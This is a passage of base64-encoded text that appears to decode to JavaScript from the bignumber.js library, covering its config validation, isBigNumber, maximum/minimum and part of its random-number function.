ZXF1ZW50bHktY2hhbmdpbmcgbGlicmFyeS13aWRlIHNldHRpbmdzLlxyXG4gICAgICpcclxuICAgICAqIEFjY2VwdCBhbiBvYmplY3Qgd2l0aCB0aGUgZm9sbG93aW5nIG9wdGlvbmFsIHByb3BlcnRpZXMgKGlmIHRoZSB2YWx1ZSBvZiBhIHByb3BlcnR5IGlzXHJcbiAgICAgKiBhIG51bWJlciwgaXQgbXVzdCBiZSBhbiBpbnRlZ2VyIHdpdGhpbiB0aGUgaW5jbHVzaXZlIHJhbmdlIHN0YXRlZCk6XHJcbiAgICAgKlxyXG4gICAgICogICBERUNJTUFMX1BMQUNFUyAgIHtudW1iZXJ9ICAgICAgICAgICAwIHRvIE1BWFxyXG4gICAgICogICBST1VORElOR19NT0RFICAgIHtudW1iZXJ9ICAgICAgICAgICAwIHRvIDhcclxuICAgICAqICAgRVhQT05FTlRJQUxfQVQgICB7bnVtYmVyfG51bWJlcltdfSAgLU1BWCB0byBNQVggIG9yICBbLU1BWCB0byAwLCAwIHRvIE1BWF1cclxuICAgICAqICAgUkFOR0UgICAgICAgICAgICB7bnVtYmVyfG51bWJlcltdfSAgLU1BWCB0byBNQVggKG5vdCB6ZXJvKSAgb3IgIFstTUFYIHRvIC0xLCAxIHRvIE1BWF1cclxuICAgICAqICAgQ1JZUFRPICAgICAgICAgICB7Ym9vbGVhbn0gICAgICAgICAgdHJ1ZSBvciBmYWxzZVxyXG4gICAgICogICBNT0RVTE9fTU9ERSAgICAgIHtudW1iZXJ9ICAgICAgICAgICAwIHRvIDlcclxuICAgICAqICAgUE9XX1BSRUNJU0lPTiAgICAgICB7bnVtYmVyfSAgICAgICAgICAgMCB0byBNQVhcclxuICAgICAqICAgQUxQSEFCRVQgICAgICAgICB7c3RyaW5nfSAgICAgICAgICAgQSBzdHJpbmcgb2YgdHdvIG9yIG1vcmUgdW5pcXVlIGNoYXJhY3RlcnMgd2hpY2ggZG9lc1xyXG4gICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBub3QgY29udGFpbiAnLicuXHJcbiAgICAgKiAgIEZPUk1BVCAgICAgICAgICAge29iamVjdH0gICAgICAgICAgIEFuIG9iamVjdCB3aXRoIHNvbWUgb2YgdGhlIGZvbGxvd2luZyBwcm9wZXJ0aWVzOlxyXG4gICAgICogICAgICBkZWNpbWFsU2VwYXJhdG9yICAgICAgIHtzdHJpbmd9XHJcbiAgICAgKiAgICAgIGdyb3VwU2VwYXJhdG9yICAgICAgICAge3N0cmluZ31cclxuICAgICAqICAgICAgZ3JvdXBTaXplICAgICAgICAgICAgICB7bnVtYmVyfVxyXG4gICAgICogICAgICBzZWNvbmRhcnlHcm91cFNpemUgICAgIHtudW1iZXJ9XHJcbiAgICAgKiAgICAgIGZyYWN0aW9uR3JvdXBTZXBhcmF0b3Ige3N0cmluZ31cclxuICAgICAqICAgICAgZnJhY3Rpb25Hcm91cFNpemUgICAgICB7bnVtYmVyfVxyXG4gICAgICpcclxuICAgICAqIChUaGUgdmFsdWVzIGFzc2lnbmVkIHRvIHRoZSBhYm92ZSBGT1JNQVQgb2JqZWN0IHByb3BlcnRpZXMgYXJlIG5vdCBjaGVja2VkIGZvciB2YWxpZGl0eS4pXHJcbiAgICAgKlxyXG4gICAgICogRS5nLlxyXG4gICAgICogQmlnTnVtYmVyLmNvbmZpZyh7IERFQ0lNQUxfUExBQ0VTIDogMjAsIFJPVU5ESU5HX01PREUgOiA0IH0pXHJcbiAgICAgKlxyXG4gICAgICogSWdub3JlIHByb3BlcnRpZXMvcGFyYW1ldGVycyBzZXQgdG8gbnVsbCBvciB1bmRlZmluZWQsIGV4Y2VwdCBmb3IgQUxQSEFCRVQuXHJcbiAgICAgKlxyXG4gICAgICogUmV0dXJuIGFuIG9iamVjdCB3aXRoIHRoZSBwcm9wZXJ0aWVzIGN1cnJlbnQgdmFsdWVzLlxyXG4gICAgICovXHJcbiAgICBCaWdOdW1iZXIuY29uZmlnID0gQmlnTnVtYmVyLnNldCA9IGZ1bmN0aW9uIChvYmopIHtcclxuICAgICAgdmFyIHAsIHY7XHJcblxyXG4gICAgICBpZiAob2JqICE9IG51bGwpIHtcclxuXHJcbiAgICAgICAgaWYgKHR5cGVvZiBvYmogPT0gJ29iamVjdCcpIHtcclxuXHJcbiAgICAgICAgICAvLyBERUNJTUFMX1BMQUNFUyB7bnVtYmVyfSBJbnRlZ2VyLCAwIHRvIE1BWCBpbmNsdXNpdmUuXHJcbiAgICAgICAgICAvLyAnW0JpZ051bWJlciBFcnJvcl0gREVDSU1BTF9QTEFDRVMge25vdCBhIHByaW1pdGl2ZSBudW1iZXJ8bm90IGFuIGludGVnZXJ8b3V0IG9mIHJhbmdlfToge3Z9J1xyXG4gICAgICAgICAgaWYgKG9iai5oYXNPd25Qcm9wZXJ0eShwID0gJ0RFQ0lNQUxfUExBQ0VTJykpIHtcclxuICAgICAgICAgICAgdiA9IG9ialtwXTtcclxuICAgICAgICAgICAgaW50Q2hlY2sodiwgMCwgTUFYLCBwKTtcclxuICAgICAgICAgICAgREVDSU1BTF9QTEFDRVMgPSB2O1xyXG4gICAgICAgICAgfVxyXG5cclxuICAgICAgICAgIC8vIFJPVU5ESU5HX01PREUge251bWJlcn0gSW50ZWdlciwgMCB0byA4IGluY2x1c2l2ZS5cclxuICAgICAgICAgIC8vICdbQmlnTnVtYmVyIEVycm9yXSBST1VORElOR19NT0RFIHtub3QgYSBwcmltaXRpdmUgbnVtYmVyfG5vdCBhbiBpbnRlZ2VyfG91dCBvZiByYW5nZX06IHt2fSdcclxuICAgICAgICAgIGlmIChvYmouaGFzT3duUHJvcGVydHkocCA9ICdST1VORElOR19NT0RFJykpIHtcclxuICAgICAgICAgICAgdiA9IG9ialtwXTtcclxuICAgICAgICAgICAgaW50Q2hlY2sodiwgMCwgOCwgcCk7XHJcbiAgICAgICAgICAgIFJPVU5ESU5HX01PREUgPSB2O1xyXG4gICAgICAgICAgfVxyXG5cclxuICAgICAgICAgIC8vIEVYUE9ORU5USUFMX0FUIHtudW1iZXJ8bnVtYmVyW119XHJcbiAgICAgICAgICAvLyBJbnRlZ2VyLCAtTUFYIHRvIE1BWCBpbmNsdXNpdmUgb3JcclxuICAgICAgICAgIC8vIFtpbnRlZ2VyIC1NQVggdG8gMCBpbmNsdXNpdmUsIDAgdG8gTUFYIGluY2x1c2l2ZV0uXHJcbiAgICAgICAgICAvLyAnW0JpZ051bWJlciBFcnJvcl0gRVhQT05FTlRJQUxfQVQge25vdCBhIHByaW1pdGl2ZSBudW1iZXJ8bm90IGFuIGludGVnZXJ8b3V0IG9mIHJhbmdlfToge3Z9J1xyXG4gICAgICAgICAgaWYgKG9iai5oYXNPd25Qcm9wZXJ0eShwID0gJ0VYUE9ORU5USUFMX0FUJykpIHtcclxuICAgICAgICAgICAgdiA9IG9ialtwXTtcclxuICAgICAgICAgICAgaWYgKGlzQXJyYXkodikpIHtcclxuICAgICAgICAgICAgICBpbnRDaGVjayh2WzBdLCAtTUFYLCAwLCBwKTtcclxuICAgICAgICAgICAgICBpbnRDaGVjayh2WzFdLCAwLCBNQVgsIHApO1xyXG4gICAgICAgICAgICAgIFRPX0VYUF9ORUcgPSB2WzBdO1xyXG4gICAgICAgICAgICAgIFRPX0VYUF9QT1MgPSB2WzFdO1xyXG4gICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgIGludENoZWNrKHYsIC1NQVgsIE1BWCwgcCk7XHJcbiAgICAgICAgICAgICAgVE9fRVhQX05FRyA9IC0oVE9fRVhQX1BPUyA9IHYgPCAwID8gLXYgOiB2KTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgfVxyXG5cclxuICAgICAgICAgIC8vIFJBTkdFIHtudW1iZXJ8bnVtYmVyW119IE5vbi16ZXJvIGludGVnZXIsIC1NQVggdG8gTUFYIGluY2x1c2l2ZSBvclxyXG4gICAgICAgICAgLy8gW2ludGVnZXIgLU1BWCB0byAtMSBpbmNsdXNpdmUsIGludGVnZXIgMSB0byBNQVggaW5jbHVzaXZlXS5cclxuICAgICAgICAgIC8vICdbQmlnTnVtYmVyIEVycm9yXSBSQU5HRSB7bm90IGEgcHJpbWl0aXZlIG51bWJlcnxub3QgYW4gaW50ZWdlcnxvdXQgb2YgcmFuZ2V8Y2Fubm90IGJlIHplcm99OiB7dn0nXHJcbiAgICAgICAgICBpZiAob2JqLmhhc093blByb3BlcnR5KHAgPSAnUkFOR0UnKSkge1xyXG4gICAgICAgICAgICB2ID0gb2JqW3BdO1xyXG4gICAgICAgICAgICBpZiAoaXNBcnJheSh2KSkge1xyXG4gICAgICAgICAgICAgIGludENoZWNrKHZbMF0sIC1NQVgsIC0xLCBwKTtcclxuICAgICAgICAgICAgICBpbnRDaGVjayh2WzFdLCAxLCBNQVgsIHApO1xyXG4gICAgICAgICAgICAgIE1JTl9FWFAgPSB2WzBdO1xyXG4gICAgICAgICAgICAgIE1BWF9FWFAgPSB2WzFdO1xyXG4gICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgIGludENoZWNrKHYsIC1NQVgsIE1BWCwgcCk7XHJcbiAgICAgICAgICAgICAgaWYgKHYpIHtcclxuICAgICAgICAgICAgICAgIE1JTl9FWFAgPSAtKE1BWF9FWFAgPSB2IDwgMCA/IC12IDogdik7XHJcbiAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgIHRocm93IEVycm9yXHJcbiAgICAgICAgICAgICAgICAgKGJpZ251bWJlckVycm9yICsgcCArICcgY2Fubm90IGJlIHplcm86ICcgKyB2KTtcclxuICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAvLyBDUllQVE8ge2Jvb2xlYW59IHRydWUgb3IgZmFsc2UuXHJcbiAgICAgICAgICAvLyAnW0JpZ051bWJlciBFcnJvcl0gQ1JZUFRPIG5vdCB0cnVlIG9yIGZhbHNlOiB7dn0nXHJcbiAgICAgICAgICAvLyAnW0JpZ051bWJlciBFcnJvcl0gY3J5cHRvIHVuYXZhaWxhYmxlJ1xyXG4gICAgICAgICAgaWYgKG9iai5oYXNPd25Qcm9wZXJ0eShwID0gJ0NSWVBUTycpKSB7XHJcbiAgICAgICAgICAgIHYgPSBvYmpbcF07XHJcbiAgICAgICAgICAgIGlmICh2ID09PSAhIXYpIHtcclxuICAgICAgICAgICAgICBpZiAodikge1xyXG4gICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBjcnlwdG8gIT0gJ3VuZGVmaW5lZCcgJiYgY3J5cHRvICYmXHJcbiAgICAgICAgICAgICAgICAgKGNyeXB0by5nZXRSYW5kb21WYWx1ZXMgfHwgY3J5cHRvLnJhbmRvbUJ5dGVzKSkge1xyXG4gICAgICAgICAgICAgICAgICBDUllQVE8gPSB2O1xyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgQ1JZUFRPID0gIXY7XHJcbiAgICAgICAgICAgICAgICAgIHRocm93IEVycm9yXHJcbiAgICAgICAgICAgICAgICAgICAoYmlnbnVtYmVyRXJyb3IgKyAnY3J5cHRvIHVuYXZhaWxhYmxlJyk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgIENSWVBUTyA9IHY7XHJcbiAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgIHRocm93IEVycm9yXHJcbiAgICAgICAgICAgICAgIChiaWdudW1iZXJFcnJvciArIHAgKyAnIG5vdCB0cnVlIG9yIGZhbHNlOiAnICsgdik7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAvLyBNT0RVTE9fTU9ERSB7bnVtYmVyfSBJbnRlZ2VyLCAwIHRvIDkgaW5jbHVzaXZlLlxyXG4gICAgICAgICAgLy8gJ1tCaWdOdW1iZXIgRXJyb3JdIE1PRFVMT19NT0RFIHtub3QgYSBwcmltaXRpdmUgbnVtYmVyfG5vdCBhbiBpbnRlZ2VyfG91dCBvZiByYW5nZX06IHt2fSdcclxuICAgICAgICAgIGlmIChvYmouaGFzT3duUHJvcGVydHkocCA9ICdNT0RVTE9fTU9ERScpKSB7XHJcbiAgICAgICAgICAgIHYgPSBvYmpbcF07XHJcbiAgICAgICAgICAgIGludENoZWNrKHYsIDAsIDksIHApO1xyXG4gICAgICAgICAgICBNT0RVTE9fTU9ERSA9IHY7XHJcbiAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgLy8gUE9XX1BSRUNJU0lPTiB7bnVtYmVyfSBJbnRlZ2VyLCAwIHRvIE1BWCBpbmNsdXNpdmUuXHJcbiAgICAgICAgICAvLyAnW0JpZ051bWJlciBFcnJvcl0gUE9XX1BSRUNJU0lPTiB7bm90IGEgcHJpbWl0aXZlIG51bWJlcnxub3QgYW4gaW50ZWdlcnxvdXQgb2YgcmFuZ2V9OiB7dn0nXHJcbiAgICAgICAgICBpZiAob2JqLmhhc093blByb3BlcnR5KHAgPSAnUE9XX1BSRUNJU0lPTicpKSB7XHJcbiAgICAgICAgICAgIHYgPSBvYmpbcF07XHJcbiAgICAgICAgICAgIGludENoZWNrKHYsIDAsIE1BWCwgcCk7XHJcbiAgICAgICAgICAgIFBPV19QUkVDSVNJT04gPSB2O1xyXG4gICAgICAgICAgfVxyXG5cclxuICAgICAgICAgIC8vIEZPUk1BVCB7b2JqZWN0fVxyXG4gICAgICAgICAgLy8gJ1tCaWdOdW1iZXIgRXJyb3JdIEZPUk1BVCBub3QgYW4gb2JqZWN0OiB7dn0nXHJcbiAgICAgICAgICBpZiAob2JqLmhhc093blByb3BlcnR5KHAgPSAnRk9STUFUJykpIHtcclxuICAgICAgICAgICAgdiA9IG9ialtwXTtcclxuICAgICAgICAgICAgaWYgKHR5cGVvZiB2ID09ICdvYmplY3QnKSBGT1JNQVQgPSB2O1xyXG4gICAgICAgICAgICBlbHNlIHRocm93IEVycm9yXHJcbiAgICAgICAgICAgICAoYmlnbnVtYmVyRXJyb3IgKyBwICsgJyBub3QgYW4gb2JqZWN0OiAnICsgdik7XHJcbiAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgLy8gQUxQSEFCRVQge3N0cmluZ31cclxuICAgICAgICAgIC8vICdbQmlnTnVtYmVyIEVycm9yXSBBTFBIQUJFVCBpbnZhbGlkOiB7dn0nXHJcbiAgICAgICAgICBpZiAob2JqLmhhc093blByb3BlcnR5KHAgPSAnQUxQSEFCRVQnKSkge1xyXG4gICAgICAgICAgICB2ID0gb2JqW3BdO1xyXG5cclxuICAgICAgICAgICAgLy8gRGlzYWxsb3cgaWYgb25seSBvbmUgY2hhcmFjdGVyLCBvciBjb250YWlucyAnLicgb3IgYSByZXBlYXRlZCBjaGFyYWN0ZXIuXHJcbiAgICAgICAgICAgIGlmICh0eXBlb2YgdiA9PSAnc3RyaW5nJyAmJiAhL14uJHxcXC58KC4pLipcXDEvLnRlc3QodikpIHtcclxuICAgICAgICAgICAgICBBTFBIQUJFVCA9IHY7XHJcbiAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgdGhyb3cgRXJyb3JcclxuICAgICAgICAgICAgICAgKGJpZ251bWJlckVycm9yICsgcCArICcgaW52YWxpZDogJyArIHYpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICB9XHJcblxyXG4gICAgICAgIH0gZWxzZSB7XHJcblxyXG4gICAgICAgICAgLy8gJ1tCaWdOdW1iZXIgRXJyb3JdIE9iamVjdCBleHBlY3RlZDoge3Z9J1xyXG4gICAgICAgICAgdGhyb3cgRXJyb3JcclxuICAgICAgICAgICAoYmlnbnVtYmVyRXJyb3IgKyAnT2JqZWN0IGV4cGVjdGVkOiAnICsgb2JqKTtcclxuICAgICAgICB9XHJcbiAgICAgIH1cclxuXHJcbiAgICAgIHJldHVybiB7XHJcbiAgICAgICAgREVDSU1BTF9QTEFDRVM6IERFQ0lNQUxfUExBQ0VTLFxyXG4gICAgICAgIFJPVU5ESU5HX01PREU6IFJPVU5ESU5HX01PREUsXHJcbiAgICAgICAgRVhQT05FTlRJQUxfQVQ6IFtUT19FWFBfTkVHLCBUT19FWFBfUE9TXSxcclxuICAgICAgICBSQU5HRTogW01JTl9FWFAsIE1BWF9FWFBdLFxyXG4gICAgICAgIENSWVBUTzogQ1JZUFRPLFxyXG4gICAgICAgIE1PRFVMT19NT0RFOiBNT0RVTE9fTU9ERSxcclxuICAgICAgICBQT1dfUFJFQ0lTSU9OOiBQT1dfUFJFQ0lTSU9OLFxyXG4gICAgICAgIEZPUk1BVDogRk9STUFULFxyXG4gICAgICAgIEFMUEhBQkVUOiBBTFBIQUJFVFxyXG4gICAgICB9O1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiB0cnVlIGlmIHYgaXMgYSBCaWdOdW1iZXIgaW5zdGFuY2UsIG90aGVyd2lzZSByZXR1cm4gZmFsc2UuXHJcbiAgICAgKlxyXG4gICAgICogdiB7YW55fVxyXG4gICAgICovXHJcbiAgICBCaWdOdW1iZXIuaXNCaWdOdW1iZXIgPSBmdW5jdGlvbiAodikge1xyXG4gICAgICByZXR1cm4gdiBpbnN0YW5jZW9mIEJpZ051bWJlciB8fCB2ICYmIHYuX2lzQmlnTnVtYmVyID09PSB0cnVlIHx8IGZhbHNlO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiBhIG5ldyBCaWdOdW1iZXIgd2hvc2UgdmFsdWUgaXMgdGhlIG1heGltdW0gb2YgdGhlIGFyZ3VtZW50cy5cclxuICAgICAqXHJcbiAgICAgKiBhcmd1bWVudHMge251bWJlcnxzdHJpbmd8QmlnTnVtYmVyfVxyXG4gICAgICovXHJcbiAgICBCaWdOdW1iZXIubWF4aW11bSA9IEJpZ051bWJlci5tYXggPSBmdW5jdGlvbiAoKSB7XHJcbiAgICAgIHJldHVybiBtYXhPck1pbihhcmd1bWVudHMsIFAubHQpO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiBhIG5ldyBCaWdOdW1iZXIgd2hvc2UgdmFsdWUgaXMgdGhlIG1pbmltdW0gb2YgdGhlIGFyZ3VtZW50cy5cclxuICAgICAqXHJcbiAgICAgKiBhcmd1bWVudHMge251bWJlcnxzdHJpbmd8QmlnTnVtYmVyfVxyXG4gICAgICovXHJcbiAgICBCaWdOdW1iZXIubWluaW11bSA9IEJpZ051bWJlci5taW4gPSBmdW5jdGlvbiAoKSB7XHJcbiAgICAgIHJldHVybiBtYXhPck1pbihhcmd1bWVudHMsIFAuZ3QpO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFJldHVybiBhIG5ldyBCaWdOdW1iZXIgd2l0aCBhIHJhbmRvbSB2YWx1ZSBlcXVhbCB0byBvciBncmVhdGVyIHRoYW4gMCBhbmQgbGVzcyB0aGFuIDEsXHJcbiAgICAgKiBhbmQgd2l0aCBkcCwgb3IgREVDSU1BTF9QTEFDRVMgaWYgZHAgaXMgb21pdHRlZCwgZGVjaW1hbCBwbGFjZXMgKG9yIGxlc3MgaWYgdHJhaWxpbmdcclxuICAgICAqIHplcm9zIGFyZSBwcm9kdWNlZCkuXHJcbiAgICAgKlxyXG4gICAgICogW2RwXSB7bnVtYmVyfSBEZWNpbWFsIHBsYWNlcy4gSW50ZWdlciwgMCB0byBNQVggaW5jbHVzaXZlLlxyXG4gICAgICpcclxuICAgICAqICdbQmlnTnVtYmVyIEVycm9yXSBBcmd1bWVudCB7bm90IGEgcHJpbWl0aXZlIG51bWJlcnxub3QgYW4gaW50ZWdlcnxvdXQgb2YgcmFuZ2V9OiB7ZHB9J1xyXG4gICAgICogJ1tCaWdOdW1iZXIgRXJyb3JdIGNyeXB0byB1bmF2YWlsYWJsZSdcclxuICAgICAqL1xyXG4gICAgQmlnTnVtYmVyLnJhbmRvbSA9IChmdW5jdGlvbiAoKSB7XHJcbiAgICAgIHZhciBwb3cyXzUzID0gMHgyMDAwMDAwMDAwMDAwMDtcclxuXHJcbiAgICAgIC8vIFJldHVybiBhIDUzIGJpdCBpbnRlZ2VyIG4sIHdoZXJlIDAgPD0gbiA8IDkwMDcxOTkyNTQ3NDA5OTIuXHJcbiAgICAgIC8vIENoZWNrIGlmIE1hdGgucmFuZG9tKCkgcHJvZHVjZXMgbW9yZSB0aGFuIDMyIGJpdHMgb2YgcmFuZG9tbmVzcy5cclxuICAgICAgLy8gSWYgaXQgZG9lcywgYXNzdW1lIGF0IGxlYXN0IDUzIGJpdHMgYXJlIHByb2R1Y2VkLCBvdGhlcndpc2UgYXNzdW1lIGF0IGxlYXN0IDMwIGJpdHMuXHJcbiAgICAgIC8vIDB4NDAwMDAwMDAgaXMgMl4zMCwgMHg4MDAwMDAgaXMgMl4yMywgMHgxZmZmZmYgaXMgMl4yMSAtIDEuXHJcbiAgICAgIHZhciByYW5kb201M2JpdEludCA9IChNYXRoLnJhbmRvbSgpICogcG93Ml81MykgJiAweDFmZmZmZlxyXG4gICAgICAgPyBmdW5jdGlvbiAoKSB7IHJldHVybiBtYXRoZmxvb3IoTWF0aC5yYW5kb20oKSAqIHBvdzJfNTMpOyB9XHJcbiAgICAgICA6IGZ1bmN0aW9uICgpIHsgcmV0dXJuICgoTWF0aC5yYW5kb20oKSAqIDB4NDAwMDAwMDAgfCAwKSAqIDB4ODAwMDAwKSArXHJcbiAgICAgICAgIChNYXRoLnJhbmRvbSgpICogMHg4MDAwMDAgfCAwKTsgfTtcclxuXHJcbiAgICAgIHJldHVybiBmdW5jdGlvbiAoZHApIHtcclxuICAgICAgICB2YXIgYSwgYiwgZSwgaywgdixcclxuICAgICAgICAgIGkgPSAwLFxyXG4gICAgICAgICAgYyA9IFtdLFxyXG4gICAgICAgICAgcmFuZCA9IG5ldyBCaWdOdW1iZXIoT05FKTtcclxuXHJcbiAgICAgICAgaWYgKGRwID09IG51bGwpIGRwID0gREVDSU1BTF9QTEFDRVM7XHJcbiAgICAgICAgZWxzZSBpbnRDaGVjayhkcCwgMCwgTUFYKTtcclxuXHJcbiAgICAgICAgayA9IG1hdGhjZWlsKGRwIC8gTE9HX0JBU0UpO1xyXG5cclxuICAgICAgICBpZiAoQ1JZUFRPKSB7XHJcblxyXG4gICAgICAgICAgLy8gQnJvd3NlcnMgc3VwcG9ydGluZyBjcnlwdG8uZ2V0UmFuZG9tVmFsdWVzLlxyXG4gICAgICAgICAgaWYgKGNyeXB0by5nZXRSYW5kb21WYWx1ZXMpIHtcclxuXHJcbiAgICAgICAgICAgIGEgPSBjcnlwdG8uZ2V0UmFuZG9tVmFsdWVzKG5ldyBVaW50MzJBcnJheShrICo9IDIpKTtcclxuXHJcbiAgICAgICAgICAgIGZvciAoOyBpIDwgazspIHtcclxuXHJcbiAgICAgICAgICAgICAgLy8gNTMgYml0czpcclxuICAgICAgICAgICAgICAvLyAoKE1hdGgucG93KDIsIDMyKSAtIDEpICogTWF0aC5wb3coMiwgMjEpKS50b1N0cmluZygyKVxyXG4gICAgICAgICAgICAgIC8vIDExMTExIDExMTExMTExIDExMTExMTExIDExMTExMTExIDExMTAwMDAwIDAwMDAwMDAwIDAwMDAwMDAwXHJcbiAgICAgICAgICAgICAgLy8gKChNYXRoLnBvdygyLCAzMikgLSAxKSA+Pj4gMTEpLnRvU3RyaW5nKDIpXHJcbiAgICAgICAgICAgICAgLy8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMTExMTEgMTExMTExMTEgMTExMTExMTFcclxuICAgICAgICAgICAgICAvLyAweDIwMDAwIGlzIDJeMjEuXHJcbiAgICAgICAgICAgICAgdiA9IGFbaV0gKiAweDIwMDAwICsgKGFbaSArIDFdID4+PiAxMSk7XHJcblxyXG4gICAgICAgICAgICAgIC8vIFJlamVjdGlvbiBzYW1wbGluZzpcclxuICAgICAgICAgICAgICAvLyAwIDw9IHYgPCA5MDA3MTk5MjU0NzQwOTkyXHJcbiAgICAgICAgICAgICAgLy8gUHJvYmFiaWxpdHkgdGhhdCB2ID49IDllMTUsIGlzXHJcbiAgICAgICAgICAgICAgLy8gNzE5OTI1NDc0MDk5MiAvIDkwMDcxOTkyNTQ3NDA5OTIgfj0gMC4wMDA4LCBpLmUuIDEgaW4gMTI1MVxyXG4gICAgICAgICAgICAgIGlmICh2ID49IDllMTUpIHtcclxuICAgICAgICAgICAgICAgIGIgPSBjcnlwdG8uZ2V0UmFuZG9tVmFsdWVzKG5ldyBVaW50MzJBcnJheSgyKSk7XHJcbiAgICAgICAgICAgICAgICBhW2ldID0gYlswXTtcclxuICAgICAgICAgICAgICAgIGFbaSArIDFdID0gYlsxXTtcclxuICAgICAgICAgICAgICB9IGVsc2Uge1xyXG5cclxuICAgICAgICAgICAgICAgIC8vIDAgPD0gdiA8PSA4OTk5OTk5OTk5OTk5OTk5XHJcbiAgICAgICAgICAgICAgICAvLyAwIDw9ICh2ICUgMWUxNCkgPD0gOTk5OTk5OTk5OTk5OTlcclxuICAgICAgICAgICAgICAgIGMucHVzaCh2ICUgMWUxNCk7XHJcbiAgICAgICAgICAgICAgICBpICs9IDI7XHJcbiAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIGkgPSBrIC8gMjtcclxuXHJcbiAgICAgICAgICAvLyBOb2RlLmpzIHN1cHBvcnRpbmcgY3J5cHRvLnJhbmRvbUJ5dGVzLlxyXG4gICAgICAgICAgfSBlbHNlIGlmIChjcnlwdG8ucmFuZG9tQnl0ZXMpIHtcclxuXHJcbiAgICAgICAgICAgIC8vIGJ1ZmZlclxyXG4gICAgICAgICAgICBhID0gY3J5cHRvLnJhbmRvbUJ5dGVzKGsgKj0gNyk7XHJcblxyXG4gICAgICAgICAgICBmb3IgKDsgaSA8IGs7KSB7XHJcblxyXG4gICAgICAgICAgICAgIC8vIDB4MTAwMDAwMDAwMDAwMCBpcyAyXjQ4LCAweDEwMDAwMDAwMDAwIGlzIDJeNDBcclxuICAgICAgICAgICAgICAvLyAweDEwMDAwMDAwMCBpcyAyXjMyLCAweDEwMDAwMDAgaXMgMl4yNFxyXG4gICAgICAgICAgICAgIC8vIDExMTExIDExMTExMTExIDExMTExMTExIDExMTExMTExIDExMTExMTExIDExMTExMTExIDExMTExMTExXHJcbiAgICAgICAgICAgICAgLy8gMCA8PSB2IDwgOTAwNzE5OTI1NDc0MDk5MlxyXG4gICAgICAgICAgICAgIHYgPSAoKGFbaV0gJiAzMSkgKiAweDEwMDAwMDAwMDAwMDApICsgKGFbaSArIDFdICogMHgxMDAwMDAwMDAwMCkgK1xyXG4gICAgICAgICAgICAgICAgIChhW2kgKyAyXSAqIDB4MTAwMDAwMDAwKSArIChhW2kgKyAzXSAqIDB4MTAwMDAwMCkgK1xyXG4gICAgICAgICAgICAgICAgIChhW2kgKyA0XSA8PCAxNikgKyAoYVtpICsgNV0gPDwgOCkgKyBhW2kgKyA2XTtcclxuXHJcbiAgICAgICAgICAgICAgaWYgKHYgPj0gOWUxNSkge1xyXG4gICAgICAgICAgICAgICAgY3J5cHRvLnJhbmRvbUJ5dGVzKDcpLmNvcHkoYSwgaSk7XHJcbiAgICAgICAgICAgICAgfSBlbHNlIHtcclxuXHJcbiAgICAgICAgICAgICAgICAvLyAwIDw9ICh2ICUgMWUxNCkgPD0gOTk5OTk5OTk5OTk5OTlcclxuICAgICAgICAgICAgICAgIGMucHVzaCh2ICUgMWUxNCk7XHJcbiAgICAgICAgICAgICAgICBpICs9IDc7XHJcbiAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIGkgPSBrIC8gNztcclxuICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgIENSWVBUTyA9IGZhbHNlO1xyXG4gICAgICAgICAgICB0aHJvdyBFcnJvclxyXG4gICAgICAgICAgICAgKGJpZ251bWJlckVycm9yICsgJ2NyeXB0byB1bmF2YWlsYWJsZScpO1xyXG4gICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLy8gVXNlIE1hdGgucmFuZG9tLlxyXG4gICAgICAgIGlmICghQ1JZUFRPKSB7XHJcblxyXG4gICAgICAgICAgZm9yICg7IGkgPCBrOykge1xyXG4gICAgICAgICAgICB2ID0gcmFuZG9tNTNiaXRJbnQoKTtcclxuICAgICAgICAgICAgaWYgKHYgPCA5ZTE1KSBjW2krK10gPSB2ICUgMWUxNDtcclxuICAgICAgICAgIH1cclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGsgPSBjWy0taV07XHJcbiAgICAgICAgZHAgJT0gTE9HX0JBU0U7XHJcblxyXG4gICAgICAgIC8vIENvbnZlcnQgdHJhaWxpbmcgZGlnaXRzIHRvIHplcm9zIGFjY29yZGluZyB0byBkcC5cclxuICAgICAgICBpZiAoayAmJiBkcCkge1xyXG4gICAgICAgICAgdiA9IFBPV1NfVEVOW0xPR19CQVNFIC0gZHBdO1xyXG4gICAgICAgICAgY1tpXSA9IG1hdGhmbG9vcihrIC8gdikgKiB2O1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLy8gUmVtb3ZlIHRyYWlsaW5nIGVsZW1lbnRzIHdoaWNoIGFyZSB6ZXJvLlxyXG4gICAgICAgIGZvciAoOyBjW2ldID09PSAwOyBjLnBvcCgpLCBpLS0pO1xyXG5cclxuICAgICAgICAvLyBaZXJ